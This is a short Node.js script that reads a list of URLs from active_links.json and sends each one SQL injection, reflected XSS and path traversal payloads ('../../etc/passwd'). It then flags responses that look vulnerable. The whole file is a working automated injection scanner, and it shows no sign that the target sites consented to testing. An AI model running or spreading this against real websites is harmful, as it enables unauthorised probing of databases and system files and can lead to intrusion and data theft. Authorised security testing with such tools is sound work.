// autoInjectorFromActive.js - Inject all from active_links.json
const axios = require('axios');
const fs = require('fs');

const payloads = [
  "' OR '1'='1",
  "<script>alert(1)</script>",
  "../../etc/passwd",
  "' UNION SELECT NULL, user(), database(), version() --"
];

async function injectAllActiveLinks() {
  const links = JSON.parse(fs.readFileSync("active_links.json", "utf-8"));
  console.log(`🚀 Auto-injecting ${links.length} active links...\n`);

  for (const entry of links) {
    const url = entry.url;
    for (const payload of payloads) {
      try {
        const targetUrl = url.includes('?') ? url + payload : url + '?q=' + encodeURIComponent(payload);
        const res = await axios.get(targetUrl);
        const found = res.data.includes('sql') || res.data.includes('error') || res.data.includes('<script>');
        console.log(`🧪 ${res.status} - ${targetUrl} ${found ? "⚠️ Possible VULN" : ""}`);
      } catch (e) {
        console.log(`❌ ${e.response?.status || 'ERR'} - ${url}`);
      }
    }
  }
  console.log("\n✅ Auto injection process complete.");
}

injectAllActiveLinks();
